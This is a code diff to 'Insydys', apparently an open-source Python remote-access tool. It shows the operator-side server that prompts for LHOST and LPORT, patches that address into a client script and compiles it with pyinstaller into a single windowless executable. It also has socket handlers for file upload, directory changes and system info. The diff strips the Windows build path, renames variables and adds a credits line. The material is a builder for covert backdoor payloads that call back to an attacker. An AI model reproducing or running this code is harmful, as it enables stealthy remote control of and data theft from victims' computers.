@@ -299,61 +299,13 @@ def Generate_exe():
    global ports
    ports=str(port)
    print("****EXE GENERATION STAGE****")
-   OS=input("Generate executable for(Windows/Linux)?")
-   while Os=="":
-      OS=input("Generate executable for(Windows/Linux)?")
-   if OS[:7]=="Windows" or OS[:7]=="windows":
-      global windows_file
-      windows_file=input("Enter file name for executable:")
-      windows_compiler()
-   elif OS[:6]=="Linux" or  OS[:6]=="linux":
-      global linux_file
-      linux_file=input("Enter file name for executable:")
-      linux_compiler()
-   else:
-      print("Please check your selection")
-      return Generate_exe()
-      
-def windows_compiler():
-   global host
-   global ports
-   global windows_file
-   file = open("insydys_client.py", "r")
-   text = file.read()
-   file.close()
-   file = open("insydys_client.py", "w")
-   file.write(text.replace('0.0.0.0',host))
-   file.close()
-   file = open("insydys_client.py", "r")
-   text = file.read()
-   file.close()
-   file = open("insydys_client.py", "w")
-   file.write(text.replace('0000',ports))
-   file.close()
-   file_path=input("Enter path for output file:")
-   print("Generating exe please wait...")
-   cc="wine pyinstaller.exe --clean --onefile --noconsole insydys_client.py --distpath "+file_path+" --name "
-   sh=sp.Popen(cc+windows_file,shell=True,
-                              stdout=sp.PIPE,
-                              stderr=sp.PIPE,
-                              stdin=sp.PIPE)
+   global linux_file
+   _file=input("Enter file name for executable:")
+   compiler()
 
 
-   print("file generated saved at",os.getcwd(),"/dist/",windows_file)
-   file = open("insydys_client.py", "r")
-   text = file.read()
-   file.close()
-   file = open("insydys_client.py", "w")
-   file.write(text.replace(host,'0.0.0.0'))
-   file.close()
-   file = open("insydys_client.py", "r")
-   text = file.read()
-   file.close()
-   file = open("insydys_client.py", "w")
-   file.write(text.replace(ports,'0000'))
-   file.close()
    
-def linux_compiler():
+def compiler():
    global linux_file
    global host
    global ports
@@ -369,10 +321,10 @@ def linux_compiler():
    file = open("insydys_client.py", "w")
    file.write(text.replace('0000',ports))
    file.close()
-   file_path2=input("Enter path for output file:")
+   file_path=input("Enter path for output file:")
    print("Generating exe please wait...")
-   subprocess.call(["pyinstaller","--onefile","--clean","--noconsole","insydys_client.py","--distpath",file_path2,"--name",linux_file])
-   print("file generated saved at",file_path2)
+   subprocess.call(["pyinstaller","--onefile","--clean","--noconsole","insydys_client.py","--distpath",file_path,"--name",_file])
+   print("file generated saved at",file_path)
    file = open("insydys_client.py", "r")
    text = file.read()
    file.close()
@@ -416,11 +368,6 @@ def upload():
       conn.send(Hostfail.encode())
        
 
-   '''else:
-          F='failed file not found'
-          s.send(F)
-          print(F)
-           '''
 def cd():
    global insydys
    global conn
@@ -501,12 +448,12 @@ def sysinfo():
 def server():
    global host
    global port
-   host=input("Enter connection I.P address:")
+   host=input("LHOST:")
    while host=="":
-      host=input("Enter connection I.P address:")
-   port=int(input("Enter connection port:"))
+      host=input("LHOST:")
+   port=int(input("LPORT:"))
    while port=="":
-      port=int(input("Enter connection port:"))
+      port=int(input("LPORT:"))
    print("******Server initialisation stage******")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
@@ -645,6 +592,7 @@ def server():
 def main():
    custom_fig = Figlet(font='graffiti')
    print(custom_fig.renderText('Insydys'))
+   print("Credits:Austin Wafula    https://github.com/AustinWafula/insydys/")
    global host
    global port
    start_server=input("(1)Start insydys session with entered host and port"
